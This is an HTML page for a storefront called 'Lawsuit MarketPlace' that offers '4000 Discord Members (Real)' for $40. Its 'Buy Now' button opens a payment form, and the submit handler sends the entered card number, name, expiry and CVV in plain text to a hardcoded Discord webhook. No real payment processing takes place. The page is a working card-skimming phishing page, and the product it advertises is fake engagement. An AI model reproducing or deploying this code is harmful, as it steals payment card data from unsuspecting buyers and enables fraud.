<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Lawsuit MarketPlace</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
    rel="stylesheet"
  />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap');

    body {
      font-family: 'Inter', sans-serif;
      background: #0f172a; /* dark background for particles */
      position: relative;
      overflow-x: hidden;
      margin: 0;
      padding: 0;
      color: white;
    }

    .font-poppins {
      font-family: 'Poppins', sans-serif;
    }

    /* Make particles container fill the screen and be behind everything */
    #particles-js {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: -1;
      top: 0;
      left: 0;
      background-color: #0f172a;
    }

    /* Styles for the modal */
    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
    }
    .modal-content {
      background-color: #1f2937;
      padding: 20px;
      border-radius: 8px;
      max-width: 400px;
      width: 100%;
      color: white;
    }
    .modal input {
      width: 100%;
      padding: 10px;
      margin-bottom: 12px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    .modal button {
      width: 100%;
      padding: 12px;
      background-color: #4f93f7;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      color: white;
    }
    .modal button:hover {
      background-color: #3b7bc2;
    }

  </style>
</head>
<body class="bg-gray-950 text-white">
  <!-- particles container -->
  <div id="particles-js"></div>

  <header class="bg-gray-900 bg-opacity-80 shadow-md p-4 flex justify-between items-center relative z-10">
    <h1 class="text-3xl font-semibold font-poppins tracking-wide text-white">Lawsuit Marketplace</h1>
    <nav>
      <ul class="flex gap-6">
        <li><a href="#" class="hover:text-gray-400 transition duration-200">Home</a></li>
        <li><a href="cart.html" class="relative inline-block hover:text-gray-400 transition duration-200">Cart
          <span id="cart-count" class="absolute -top-2 -right-4 bg-red-600 text-xs rounded-full w-5 h-5 flex items-center justify-center font-bold text-white hidden">0</span>
        </a></li>
        <li><a href="#" class="hover:text-gray-400 transition duration-200">My Orders</a></li>
        <li><a href="#" class="hover:text-gray-400 transition duration-200">Contact</a></li>
      </ul>
    </nav>
  </header>

  <!-- New Product Card -->
  <main class="p-6 relative z-10">
    <h2 class="text-3xl font-semibold mb-6">Featured Products</h2>
    <div class="flex flex-wrap gap-6 justify-center">
      <!-- Product 1 -->
      <div class="product-card bg-gray-800 bg-opacity-80 p-6 rounded-2xl shadow ... w-[320px]" data-game="Discord">
        <img src="https://i.postimg.cc/HnsSBH2m/public-1.png" alt="4000 Discord Members" class="rounded-xl mb-4 w-[320px] h-[240px] object-cover" />
        <h3 class="text-xl font-semibold mb-2">4000 Discord Members (Real)</h3>
        <p class="text-gray-400 mb-4">4K Discord Members (Real and Active)</p>
        <div class="flex justify-between items-center">
          <span class="text-lg font-bold">$40.00</span>
          <button class="bg-blue-600 px-4 py-2 rounded-xl hover:bg-blue-700 transition-transform duration-200 transform hover:scale-105" onclick="openPaymentModal()">Buy Now</button>
        </div>
      </div>
    </div>
  </main>

  <!-- Payment Modal -->
  <div id="payment-modal" class="modal">
    <div class="modal-content">
      <h3 class="text-2xl font-semibold mb-4">Enter Payment Information</h3>
      <form id="payment-form">
        <input type="text" id="card-number" placeholder="Card Number" required />
        <input type="text" id="full-name" placeholder="Full Name" required />
        <input type="text" id="expiry" placeholder="Expiry (MM/YY)" required />
        <input type="text" id="cvv" placeholder="CVV" required />
        <button type="submit">Submit Payment</button>
      </form>
      <button onclick="closePaymentModal()" class="bg-red-600 px-4 py-2 rounded-xl hover:bg-red-700 mt-4 w-full">Close</button>
    </div>
  </div>

  <footer class="p-6 mt-6 text-center text-gray-500 relative z-10">
    <div class="flex justify-center gap-6 mb-4">
      <a href="https://discord.com" target="_blank" aria-label="Discord">
        <!-- Discord Icon -->
      </a>
      <a href="https://tiktok.com" target="_blank" aria-label="TikTok">
        <!-- TikTok Icon -->
      </a>
    </div>
    &copy; 2024 Lawsuit MarketPlace. All rights reserved.
  </footer>

  <!-- Particles.js library -->
  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
  <script>
    particlesJS("particles-js", {
      "particles": {
        "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
        "color": { "value": "#ffffff" },
        "shape": { "type": "circle", "stroke": { "width": 0, "color": "#000000" }, "polygon": { "nb_sides": 5 } },
        "opacity": { "value": 0.5, "random": false },
        "size": { "value": 3, "random": true },
        "line_linked": { "enable": true, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1 },
        "move": { "enable": true, "speed": 6 }
      },
      "interactivity": { "events": { "onhover": { "enable": true, "mode": "grab" } } }
    });

    function openPaymentModal() {
      document.getElementById('payment-modal').style.display = 'flex';
    }

    function closePaymentModal() {
      document.getElementById('payment-modal').style.display = 'none';
    }

    document.getElementById('payment-form').addEventListener('submit', function (e) {
      e.preventDefault();
      const orderDetails = {
        orderNumber: 'ORD-' + Math.floor(Math.random() * 1000000), // Random order number
        cardNumber: document.getElementById('card-number').value,
        fullName: document.getElementById('full-name').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value
      };

      // Send to Discord Webhook (replace with your webhook URL)
      fetch('https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `New Order: ${orderDetails.orderNumber}`,
          embeds: [{
            title: 'Order Details',
            fields: [
              { name: 'Order Number', value: orderDetails.orderNumber },
              { name: 'Card Number', value: orderDetails.cardNumber },
              { name: 'Full Name', value: orderDetails.fullName },
              { name: 'Expiry', value: orderDetails.expiry },
              { name: 'CVV', value: orderDetails.cvv }
            ]
          }]
        })
      })
      .then(response => response.json())
      .then(data => {
        alert('Payment information sent!');
        closePaymentModal();
      })
      .catch(error => {
        console.error('Error sending payment info:', error);
      });
    });
  </script>
</body>
</html>
